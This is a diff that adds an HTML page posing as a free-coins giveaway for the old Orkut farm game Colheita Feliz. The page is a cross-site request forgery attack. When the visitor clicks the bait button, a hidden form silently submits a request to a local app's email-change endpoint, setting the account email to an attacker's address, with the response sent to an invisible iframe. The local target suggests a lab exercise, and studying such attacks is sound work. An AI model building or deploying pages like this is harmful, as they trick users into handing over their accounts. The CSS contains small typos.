@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Moedas Verdes Grátis - Colheita Feliz</title>
+    <style>
+        bsody { 
+            font-family: 'Verdana', sans-serif; 
+            text-align: center; 
+            background-color: #87CEEB; /* Um azul céu, lembrando o jogo */
+            padding-top: 50px;
+        }
+        .card { 
+            background: #f4fce8; /* Um verde bem claro, de fazenda */
+            margin: 50px auto; 
+            padding: 40px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2); 
+            width: 600px;
+            border: 5px solid #5C4033; /* Borda marrom, rústica */
+        }
+        h1 { 
+            color: #006400; /* Verde escuro */
+            font-size: 2em;
+        }
+        p { 
+            font-size: 1.2em; 
+            color: #333;
+        }
+        .button { 
+            background: #34A853; /* Um verde vibrante */
+            color: white; 
+            padding: 15px 30px; 
+            border: none; 
+            border-radius: 50px; 
+            font-size: 1.5em; 
+            font-weight: bold;
+            cursor: pointer; 
+            transition: transform 0.2s; 
+            margin-top: 20px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+        }
+        .button:hover { 
+            transform: scale(1.1); 
+            background: #2C8B47;
+        }
+        .orkut-logo {
+            font-weight: bold;
+            font-style: italic;
+            color: #d14836; /* Cor que lembra o logo do Orkut */
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🌱 SAUDADES DA COLHEITA FELIZ? 🌱</h1>
+        <p>
+            Lembrou da sua fazendinha no <span class="orkut-logo">Orkut</span>? <br>
+            Resgate um pacote de <strong>Moedas Verdes GRÁTIS</strong> para matar a saudade!
+        </p>
+        
+        <form id="csrf-form" action="http://127.0.0.1:5001/atualizar-email" method="POST" target="hidden-iframe">
+            <input type="hidden" name="email" value="email.do.atacante@exemplo.com"">
+        </form>
+
+        <iframe name="hidden-iframe" style="display:none;"></iframe>
+
+        <button class="button" onclick="document.getElementById('csrf-form').submit();">PEGAR MINHAS MOEDAS!</button>
+    </div>
+</body>
+</html>
